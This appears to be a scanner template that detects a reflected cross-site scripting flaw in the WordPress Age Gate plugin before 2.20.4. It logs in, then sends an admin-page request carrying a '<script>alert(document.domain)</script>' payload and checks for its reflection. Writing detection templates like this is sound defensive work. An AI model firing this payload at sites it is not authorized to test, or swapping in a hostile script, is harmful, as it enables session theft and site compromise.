id: age-gate-xss
brief:
    title: WordPress Age Gate <2.20.4 - Cross-Site Scripting
    by: akincibor
    level: high
    about: WordPress Age Gate plugin before 2.20.4 contains a cross-site scripting vulnerability. The plugin does not escape some URLs before outputting them back in attributes.
    label:
        - xss
        - authenticated
        - age-gate
        - wpscan
        - wordpress
        - wp-plugin
        - wp
        - vuln
    score: CVSS:7.2
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/wp-login.php'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
      signs:
        - "on": word
          has:
            - '"><script>alert(document.domain)</script>'
            - Age Gate Restriction Settings
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
    - verb: GET
      to:
        - '{{BaseURL}}/wp-admin/admin.php?page=age-gate&a%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
      signs:
        - "on": word
          has:
            - '"><script>alert(document.domain)</script>'
            - Age Gate Restriction Settings
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
